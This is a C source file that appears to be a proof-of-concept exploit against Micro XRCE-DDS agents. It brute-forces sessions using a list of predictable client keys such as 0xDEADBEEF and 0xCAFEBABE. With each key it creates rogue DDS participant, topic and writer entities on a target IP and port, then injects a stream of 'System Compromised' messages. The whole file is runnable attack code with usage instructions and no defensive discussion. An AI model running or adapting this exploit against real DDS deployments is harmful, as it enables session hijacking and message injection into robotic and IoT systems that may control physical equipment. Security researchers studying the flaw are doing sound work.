// Compile: gcc attack_session_hijack.c -o session_hijack -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY

// Common predictable keys found in examples
uint32_t common_keys[] = {
    0xAAAABBBB,
    0xCCCCDDDD,
    0x11111111,
    0x22222222,
    0xDEADBEEF,
    0xCAFEBABE,
    0x12345678
};

void hijack_session_and_inject(char* ip, char* port, uint32_t target_key) {
    printf("[*] Attempting to hijack session with key: 0x%08X\n", target_key);
    
    // Initialize transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[-] Failed to init transport\n");
        return;
    }
    
    // Create session with target's key
    uxrSession session;
    uxr_init_session(&session, &transport.comm, target_key);
    
    if (!uxr_create_session(&session)) {
        printf("[-] Failed to create hijacked session\n");
        uxr_close_udp_transport(&transport);
        return;
    }
    
    printf("[+] Successfully hijacked session!\n");
    
    // Create streams
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer, 
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    // Create malicious entities
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds>"
            "<participant>"
            "<rtps>"
            "<name>HACKED_PARTICIPANT</name>"
            "</rtps>"
            "</participant>"
            "</dds>";
    
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, 
                                      participant_xml, UXR_REPLACE);
    
    // Create malicious topic
    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char* topic_xml = "<dds>"
            "<topic>"
            "<name>MaliciousTopic</name>"
            "<dataType>string</dataType>"
            "</topic>"
            "</dds>";
    
    uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, 
                                topic_xml, UXR_REPLACE);
    
    // Create publisher
    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    const char* publisher_xml = "";
    uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, 
                                    publisher_xml, UXR_REPLACE);
    
    // Create data writer
    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    uxrQoS_t qos = {
        .durability = UXR_DURABILITY_VOLATILE,
        .reliability = UXR_RELIABILITY_RELIABLE,
        .history = UXR_HISTORY_KEEP_LAST,
        .depth = 10
    };
    
    uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id, 
                                     topic_id, "", qos, UXR_REPLACE);
    
    // Wait for entity creation
    printf("[*] Waiting for entity creation...\n");
    uxr_run_session_until_confirm_delivery(&session, 2000);
    
    // Inject malicious messages
    printf("[*] Injecting malicious messages...\n");
    for (int i = 0; i < 100; i++) {
        ucdrBuffer ub;
        uint8_t data_buffer[256];
        ucdr_init_buffer(&ub, data_buffer, sizeof(data_buffer));
        
        char malicious_msg[200];
        snprintf(malicious_msg, sizeof(malicious_msg), 
                "INJECTED_MESSAGE_%d: System Compromised", i);
        
        ucdr_serialize_string(&ub, malicious_msg);
        
        uxr_buffer_request_data(&session, reliable_out, datawriter_id, 
                               ucdr_buffer_get_buffer_pointer(&ub), 
                               ucdr_buffer_get_buffer_length(&ub));
        
        printf("[+] Injected message %d\n", i);
        usleep(100000); // 100ms delay
    }
    
    // Keep session alive
    printf("[*] Keeping hijacked session alive for 60 seconds...\n");
    uxr_run_session_time(&session, 60000);
    
    // Cleanup
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    printf("[*] Attack completed\n");
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        printf("Example: %s 192.168.1.100 2018\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Session Hijacking Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);
    
    // Try all common keys
    for (int i = 0; i < sizeof(common_keys)/sizeof(common_keys[0]); i++) {
        hijack_session_and_inject(ip, port, common_keys[i]);
        sleep(2);
    }
    
    return 0;
}